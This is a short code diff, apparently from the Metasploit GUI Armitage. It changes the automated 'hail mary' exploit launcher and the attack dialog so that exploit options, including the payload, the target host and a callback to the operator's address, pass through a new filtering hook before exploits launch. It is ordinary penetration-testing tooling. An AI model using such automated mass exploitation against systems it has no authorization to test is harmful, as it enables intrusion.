@@ -98,7 +98,7 @@ sub resolveAttacks {
 
 sub _resolveAttacks {
 	# force a service data refresh before hail mary or find attacks.
-	_refreshServices(call($mclient, "db.services"));
+	_refreshServices(call($mclient, "db.services")['services']);
 
 	%results = ohash();
 	%results2 = ohash();
@@ -224,7 +224,7 @@ sub smarter_autopwn {
 		$progress = [new ProgressMonitor: $null, "Launching Exploits...", "...", 0, size(@attacks)];
 
 		thread(lambda({
-			local('$host $ex $payload $x $rport %wait');
+			local('$host $ex $payload $x $rport %wait $options');
 			while (size(@attacks) > 0 && [$progress isCanceled] == 0) {
 				($host, $ex, $payload, $rport) = @attacks[0];
 
@@ -238,7 +238,10 @@ sub smarter_autopwn {
 
 				[$progress setNote: "$host $+ : $+ $rport ( $+ $ex $+ )"];
 				[$progress setProgress: $x + 0];
-				call_async($client, "module.execute", "exploit", $ex, %(PAYLOAD => $payload, RHOST => $host, LHOST => $MY_ADDRESS, LPORT => randomPort() . '', RPORT => "$rport", TARGET => '0', SSL => iff($rport == 443, '1')));
+
+				$options = %(PAYLOAD => $payload, RHOST => $host, LHOST => $MY_ADDRESS, LPORT => randomPort() . '', RPORT => "$rport", TARGET => '0', SSL => iff($rport == 443, '1'));
+				($ex, $host, $options) = filter_data("exploit", $ex, $host, $options);
+				call_async($client, "module.execute", "exploit", $ex, $options);
 				%wait[$host] = ticks();
 				$x++; 
 				@attacks = sublist(@attacks, 1);
@@ -461,6 +464,8 @@ sub attack_dialog {
 				if ([$b isSelected]) {
 					$options["LPORT"] = randomPort();
 				}
+
+				($exploit, $host, $options) = filter_data("exploit", $exploit, $host, $options);
 
 				if (size($hosts) >= 4) {
 					call_async($client, "module.execute", "exploit", $exploit, $options);
